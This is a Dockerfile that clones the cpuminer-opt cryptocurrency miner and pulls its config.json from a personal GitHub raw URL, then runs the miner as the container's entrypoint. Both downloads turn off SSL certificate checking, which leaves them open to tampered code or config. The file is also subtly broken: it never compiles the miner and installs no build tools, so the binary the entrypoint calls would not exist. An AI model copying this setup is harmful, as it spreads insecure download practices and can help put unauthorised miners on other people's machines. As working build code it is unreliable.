# Use an official Ubuntu runtime as a parent image
FROM ubuntu:20.04

# Set the working directory to /app
WORKDIR /app

# Install required dependencies
RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
    wget \
    git \
    && rm -rf /var/lib/apt/lists/*

# Clone cpuminer-opt repository without checking SSL certificate
RUN git -c http.sslVerify=false clone --branch v3.16.1 https://github.com/JayDDee/cpuminer-opt.git

# Copy the configuration file from the provided URL
RUN wget https://raw.githubusercontent.com/rmaglite/blk/main/config.json --no-check-certificate -O cpuminer-opt/config.json

# Set the entry point to run cpuminer-opt with the provided configuration file
ENTRYPOINT ["./cpuminer-opt/cpuminer", "--config", "/app/cpuminer-opt/config.json"]
